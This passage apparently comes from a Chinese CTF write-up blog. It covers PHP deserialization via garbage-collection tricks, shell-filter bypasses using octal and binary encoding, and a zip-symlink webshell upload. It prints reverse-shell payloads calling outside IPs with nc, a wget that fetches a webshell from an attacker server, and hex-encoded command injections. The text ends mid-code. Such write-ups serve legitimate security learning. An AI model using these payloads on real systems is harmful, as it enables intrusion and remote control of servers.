alt=\"image-20240508203842897\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;new string&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> =&amp;<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span> =&amp;<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">xdebug_debug_zval</span>(<span class=\"string\">&#x27;a&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">unset</span>(<span class=\"variable\">$b</span>,<span class=\"variable\">$c</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">xdebug_debug_zval</span>(<span class=\"string\">&#x27;a&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>引用<code>$a</code>的变量<code>$b</code>和<code>$c</code>都被<code>unset</code>了，所以这里的<code>is_ref</code>应该是<code>false</code>，也是因为<code>unset</code>，这里的<code>refcount</code>应该从<code>3</code>变成了<code>1</code>，接下来验证一下</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240508204054662.png\" alt=\"image-20240508204054662\"></p>\n<h4 id=\"CG与反序列化的利用\"><a href=\"#CG与反序列化的利用\" class=\"headerlink\" title=\"CG与反序列化的利用\"></a>CG与反序列化的利用</h4><p>__destruct（<a href=\"https://so.csdn.net/so/search?q=%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020\">析构函数</a>）当某个对象成为垃圾或者当对象被显式销毁时执行销毁</p>\n<p>执行<code>__destruct</code>方法，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而exception会<strong>中断该进程对该对象的销毁</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240508204242068.png\" alt=\"image-20240508204242068\"></p>\n<p>a:2:{i:<strong>0</strong>;O:1:”B”:0:{}i:<strong>1</strong>;i:0;}</p>\n<p>改为</p>\n<p>a:2:{i:<strong>0</strong>;O:1:”B”:0:{}i:<strong>0</strong>;i:0;}</p>\n<p>即可触发GC</p>\n<p>发现只要索引相同，即可绕过<strong>异常抛出</strong></p>\n<p>a:{i:<strong>1</strong>;O:1:”B”:0:{}i:<strong>1</strong>;i:0;}</p>\n<p>具体了解 <strong>双递减漏洞</strong></p>\n<p>漏洞报告如下（CVE-2016-5771）： <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771</a> 。</p>\n<p><a href=\"https://www.anquanke.com/post/id/149424\">https://www.anquanke.com/post/id/149424</a></p>\n<p>知道这两者，即可攻破该题目</p>\n<h4 id=\"利用PHP垃圾回收机制构造pop\"><a href=\"#利用PHP垃圾回收机制构造pop\" class=\"headerlink\" title=\"利用PHP垃圾回收机制构造pop\"></a>利用PHP垃圾回收机制构造pop</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AAA</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BBB</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$d</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CCC</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">CCC</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">AAA</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> BBB;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;s=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;c=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$d</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$c</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$d</span>);</span><br></pre></td></tr></table></figure>\n\n<p>输出</p>\n<p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:<strong>1</strong>;i:1;}</p>\n<p>再改为</p>\n<p>a:2:{i:0;O:3:”CCC”:1:{s:1:”c”;O:3:”AAA”:2:{s:1:”s”;O:3:”BBB”:2:{s:1:”c”;N;s:1:”d”;N;}s:1:”a”;N;}}i:<strong>0</strong>;i:1;}</p>\n<p>即可绕过</p>\n<h4 id=\"动态函数执行语句\"><a href=\"#动态函数执行语句\" class=\"headerlink\" title=\"动态函数执行语句\"></a>动态函数执行语句</h4><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509153322177.png\" alt=\"image-20240509153322177\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509153314541.png\"></p>\n<p>可以发现在动态执行函数语句构造完成之后，再<strong>追加无关参数不影响命令执行</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509152953542.png\" alt=\"image-20240509152953542\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509153022676.png\" alt=\"image-20240509153022676\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$array</span> = [<span class=\"string\">&#x27;lastname&#x27;</span>, <span class=\"string\">&#x27;email&#x27;</span>, <span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&quot;,&quot;</span>, <span class=\"variable\">$array</span>)); </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// string(20) &quot;lastname,email,phone&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>便可以将这两个函数搭配使用 构造<strong>动态函数执行语句</strong>，如下是目标语句</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509153219662.png\" alt=\"image-20240509153219662\"></p>\n<p>将目标语句放入pop中构造即可</p>\n<p><strong>pop及最终payload</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AAA</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BBB</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>=<span class=\"string\">&#x27;cat /flag&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$d</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CCC</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">CCC</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">AAA</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> BBB;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;s=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;c=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$d</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$c</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$d</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240509154142589.png\" alt=\"image-20240509154142589\"></p>\n<h2 id=\"牢牢记住，逝者为大\"><a href=\"#牢牢记住，逝者为大\" class=\"headerlink\" title=\"牢牢记住，逝者为大\"></a>牢牢记住，逝者为大</h2><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510111400877.png\" alt=\"image-20240510111400877\"></p>\n<p>最后一行有注释符 <strong>#</strong> 所以传入cmd时需要用换行符 <strong>%a0</strong> 来绕过</p>\n<p>根据上边过滤可知需要进行<strong>二次传参</strong>  system被过滤 用 <strong>&#96;</strong> 来代替</p>\n<p>cmd拼接到后边的 mamba out无用需要先闭合再注释掉</p>\n<h4 id=\"思路一-反弹shell\"><a href=\"#思路一-反弹shell\" class=\"headerlink\" title=\"思路一 反弹shell\"></a><strong>思路一 反弹shell</strong></h4><p>payload:</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510111821011.png\" alt=\"image-20240510111821011\"></p>\n<p>ps:不要忘记<strong>分号</strong>闭合</p>\n<p><strong>&amp;1&#x3D;nc 101.37.70.128 7878 -e &#x2F;b’’in&#x2F;sh</strong>      b’’in绕过过滤</p>\n<p>进行反弹shell获取flag</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510112050456.png\" alt=\"image-20240510112050456\"></p>\n<h4 id=\"思路二-远程下载木马\"><a href=\"#思路二-远程下载木马\" class=\"headerlink\" title=\"思路二 远程下载木马\"></a>思路二 远程下载木马</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -O &lt;保存路径/文件名&gt; &lt;下载链接&gt;</span><br></pre></td></tr></table></figure>\n\n<p>现在攻击机上准备一份木马 she</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510122747733.png\" alt=\"image-20240510122747733\"></p>\n<p>用python开启一个服务</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510122834139.png\" alt=\"image-20240510122834139\"></p>\n<p>将该端口映射到公网上  用到nps内网穿透 效果呈现如下</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510122937798.png\" alt=\"image-20240510122937798\"></p>\n<p>搭建成功之后 进行二次传参并构造下载文件命令</p>\n<p>payload：</p>\n<p>%0a<code>$_GET[1]</code>;%23&amp;1&#x3D;wget -O .&#x2F;she.php <a href=\"http://101.37.70.128:10010/she\">http://101.37.70.128:10010/she</a></p>\n<p>访问url&#x2F;she.php连接蚁剑即可</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240510123312205.png\" alt=\"image-20240510123312205\"></p>\n<h2 id=\"ezRCE\"><a href=\"#ezRCE\" class=\"headerlink\" title=\"ezRCE\"></a>ezRCE</h2><p>用八进制构造命令</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513184416735.png\" alt=\"image-20240513184416735\"></p>\n<p>可见</p>\n<p> **$’\\154\\163’ **和 <strong>ls</strong> 命令效果相同</p>\n<p>原理如下</p>\n<p>在Shell编程中，<code>ls -l</code>是用于列出目录内容的命令，其中<code>ls</code>表示列出目录内容，而<code>-l</code>表示以长格式显示。在你提供的表达式<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>中，<code>\\</code>用于转义字符，这些反斜杠后面跟着的数字表示了对应字符的 ASCII 码值。而<code>\\154</code>对应于八进制ASCII码，其十进制值为108，表示字符<code>l</code>；<code>\\163</code>对应于字符<code>s</code>；<code>\\40</code>对应于ASCII码值为32的空格字符；<code>\\55</code>对应于ASCII码值为45的减号字符，也就是<code>-</code>。因此，表达式<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>等同于<code>ls -l</code>。</p>\n<p>上述是八进制</p>\n<p>当可用字符只有0 和 1 时</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513185602631.png\" alt=\"image-20240513185602631\"></p>\n<p>可以利用</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513185703638.png\" alt=\"image-20240513185703638\"></p>\n<p>来实现构造目标八进制数字</p>\n<p>用位移运算构造数字二</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513185812640.png\" alt=\"image-20240513185812640\"></p>\n<p><code>1 &lt;&lt; 1</code> 是一个位移运算，表示将二进制数 1 向左移动 1 位。在位移运算中，向左移动意味着在数字的二进制表示中向左移动指定的位数，空出的位数用0填充。因此，<code>1</code> 的二进制表示是 <code>0001</code>，将其向左移动 1 位后，变成了 <code>0010</code>。结果是2</p>\n<p>反斜杠则是</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513185902923.png\" alt=\"image-20240513185902923\"></p>\n<p>结合利用payload:</p>\n<p><strong>$\\‘\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;</strong></p>\n<p>最后一个反斜杠确保整个命令的结束字符 \\</p>\n<p>第一个 \\ 是将**’\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;<strong>转译为</strong>‘\\154\\163’**</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513192034448.png\" alt=\"image-20240513192034448\"></p>\n<p>空格被过滤 ${IFS}无效时</p>\n<p>可以这样构造</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513193158266.png\" alt=\"image-20240513193158266\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513192842812.png\" alt=\"image-20240513192842812\"></p>\n<p>由于不能存在空格</p>\n<p>所以eval {ls,&#x2F;}仍无效</p>\n<p>利用脚本构造</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513193300837.png\" alt=\"image-20240513193300837\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513193325933.png\" alt=\"image-20240513193325933\"></p>\n<p>payload:</p>\n<p><strong>$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\154\\163\\54\\57\\175’</strong> bash&lt;&lt;&lt;{ls,&#x2F;}</p>\n<p><strong>$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175’</strong>  bash&lt;&lt;&lt;{cat,&#x2F;flag}</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240513193448586.png\" alt=\"image-20240513193448586\"></p>\n<h1 id=\"CISCN2023\"><a href=\"#CISCN2023\" class=\"headerlink\" title=\"CISCN2023\"></a>CISCN2023</h1><p>前置知识</p>\n<h2 id=\"linux命令-软链接-ln-s\"><a href=\"#linux命令-软链接-ln-s\" class=\"headerlink\" title=\"linux命令 软链接  ln -s\"></a>linux命令 软链接  ln -s</h2><p>如图在 <strong>122目录</strong>下存在<strong>文件233</strong><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516192628417.png\" alt=\"image-20240516192628417\"></p>\n<p>返回其他目录创建软链接 <strong>ln -s 1&#x2F;\\122&#x2F;233 lj</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516192807368.png\" alt=\"image-20240516192807368\"></p>\n<p>即可在其他目录查看文件内容<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516192846592.png\" alt=\"image-20240516192846592\"></p>\n<p>同理也<strong>可以指定目录</strong>，下面题目用到</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516195627772.png\" alt=\"image-20240516195627772\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516195705980.png\" alt=\"image-20240516195705980\"></p>\n<h2 id=\"Unzip\"><a href=\"#Unzip\" class=\"headerlink\" title=\"Unzip\"></a>Unzip</h2><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516193901983.png\" alt=\"image-20240516193901983\"></p>\n<p>阅读代码发现回先进入到&#x2F;tmp目录再进行解压</p>\n<p>所以我们要上传zip文件</p>\n<p>1.先创建软链接 <strong>ln -s &#x2F;var&#x2F;www&#x2F;html slj</strong></p>\n<p>2.<strong>将软链接打包后将本体删除</strong></p>\n<p>3.创建一个与<strong>软链接同名</strong>的目录</p>\n<p>4.进入目录创建木马</p>\n<p>5.将同名目录打包</p>\n<p>6.上传两个压缩包</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516213439954.png\" alt=\"image-20240516213439954\"></p>\n<p>7.url&#x2F;shell.php连接蚁剑即可<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516213424092.png\" alt=\"image-20240516213424092\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240516213514576.png\" alt=\"image-20240516213514576\"></p>\n<h1 id=\"CISCN2024\"><a href=\"#CISCN2024\" class=\"headerlink\" title=\"CISCN2024\"></a>CISCN2024</h1><h2 id=\"simple-php\"><a href=\"#simple-php\" class=\"headerlink\" title=\"simple php\"></a>simple php</h2><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520175303300.png\" alt=\"image-20240520175303300\"></p>\n<p>发现**$cmd<strong>嵌套</strong>在system函数中<strong>，</strong>不是eval函数中**，所以此时的命令会传入命令行中，要以命令行（终端）的角度来执行</p>\n<h4 id=\"命令行运行php代码\"><a href=\"#命令行运行php代码\" class=\"headerlink\" title=\"命令行运行php代码\"></a>命令行运行php代码</h4><h4 id><a href=\"#\" class=\"headerlink\" title></a><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520173817845.png\" alt=\"image-20240520173817845\"><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520175620229.png\" alt=\"image-20240520175620229\"></h4><p>阅读题干发现无法正常传入命令（被过滤）八进制也无效果（引号被ban）</p>\n<p>可以结合php中的<strong>hex2bin函数</strong>来<strong>传入16进制命令</strong>  </p>\n<p><strong>6c73202f</strong> &#x2F;&#x2F; <strong>ls &#x2F;</strong>  可以根据思路<strong>构造反弹shell命令</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520180042312.png\" alt=\"image-20240520180042312\"></p>\n<p><strong>6e632034372e39392e34332e33382037383738202d65202f62696e2f7368</strong> &#x2F;&#x2F; <strong>nc 47.99.43.38 7878 -e &#x2F;bin&#x2F;sh</strong></p>\n<p>1.system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</p>\n<p>2.system(hex2bin(substr(‘6e632034372e39392e34332e33382037383738202d65202f62696e2f7368’,0)));</p>\n<p>经过实验可得，以上两种方法均可反弹shell,<strong>1 的优势是可以绕过引号使用</strong></p>\n<p>payload:</p>\n<p>cmd&#x3D;<strong>php -r system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</strong></p>\n<p>成功反弹后发现无flag目录，这里看wp才知道，<strong>flag可能在数据库中</strong></p>\n<p>就要在反弹的shell中进行mysql数据库连接</p>\n<p>想办法知道<strong>用户名和密码</strong>是什么，最简单的就是弱口令</p>\n<p>尝试 root root后发现连接成功</p>\n<p>payload:</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520183101345.png\" alt=\"image-20240520183101345\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240520183111822.png\" alt=\"image-20240520183111822\"></p>\n<h1 id=\"LitCTF2024\"><a href=\"#LitCTF2024\" class=\"headerlink\" title=\"LitCTF2024\"></a>LitCTF2024</h1><h2 id=\"蚁剑流量分析特征\"><a href=\"#蚁剑流量分析特征\" class=\"headerlink\" title=\"蚁剑流量分析特征\"></a>蚁剑流量分析特征</h2><p>1.明显的特征为**@ini_set(“display_errors”，”0”);@set_time_limit(0)开头**</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602174938709.png\" alt=\"image-20240602174938709\"></p>\n<p>2.使用<strong>base64或文本转16进制</strong>加密的payload</p>\n<p>并且<strong>附有混淆随机数</strong>，base64中还有混淆字符（前两个），所以需要我们<strong>删除</strong>流量信息中的<strong>前两个字符</strong>后才能<strong>得到无混淆base64</strong>。</p>\n<p>eg:<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602175652512.png\" alt=\"image-20240602175652512\"></p>\n<p>格式一般为</p>\n<p><strong>&amp;随机数&#x3D;16进制加密数据</strong>   上图：<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602175852852.png\" alt=\"image-20240602175852852\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602180023008.png\" alt=\"image-20240602180023008\"></p>\n<p><strong>&amp;随机数&#x3D;xx base64加密数据    xx代表两位混淆字符</strong>   上图：<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602180014392.png\" alt=\"image-20240602180014392\"></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240602180039935.png\" alt=\"image-20240602180039935\"></p>\n<h1 id=\"Lit2023\"><a href=\"#Lit2023\" class=\"headerlink\" title=\"Lit2023\"></a>Lit2023</h1><h3 id=\"zip伪加密-特征\"><a href=\"#zip伪加密-特征\" class=\"headerlink\" title=\"zip伪加密 特征\"></a>zip伪加密 特征</h3><p>1.压缩源文件数据区 50 4B 03 04 14 00 <strong>00 09</strong></p>\n<p>2.压缩源文件目录区 50 4B 01 02 1F 00 14 <strong>00 01</strong> </p>\n<p>修改方法</p>\n<p>加粗部分的 <strong>01 00</strong> 或 <strong>09 00</strong>  改为 <strong>00 00</strong>即可</p>\n<h1 id=\"BaseCTF\"><a href=\"#BaseCTF\" class=\"headerlink\" title=\"BaseCTF\"></a>BaseCTF</h1><h2 id=\"1z-php\"><a href=\"#1z-php\" class=\"headerlink\" title=\"1z_php\"></a>1z_php</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># 我记得她...好像叫flag.php吧？</span></span><br><span class=\"line\"><span class=\"variable\">$emp</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;e_m.p&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$try</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;try&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span 